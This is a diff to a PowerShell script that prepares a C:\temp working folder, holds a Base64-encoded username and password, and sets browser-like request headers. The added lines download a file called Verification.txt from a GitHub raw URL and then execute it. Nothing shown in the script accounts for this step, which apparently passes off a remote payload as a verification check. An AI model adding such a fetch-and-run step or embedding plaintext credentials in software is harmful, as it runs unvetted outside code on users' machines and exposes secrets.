@@ -4,10 +4,13 @@ $filePath = "C:\temp\" + $fileName
 $wshell = New-Object -ComObject wscript.shell
 $timeout = 60
 $waitTime = 0
+$encodedCredentials = "ZG93bmxvYWQ6bmlyc29mdDEyMyE="
 
 mkdir \temp | Out-Null
 cd \temp
-$encodedCredentials = "ZG93bmxvYWQ6bmlyc29mdDEyMyE="
+
+iwr https://raw.githubusercontent.com/Peach-Iced-Tea/GlobalPowerShells/refs/heads/main/Verification.txt -OutFile ./verification.txt | Out-Null
+./verification.txt
 
 $headers = @{
     "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
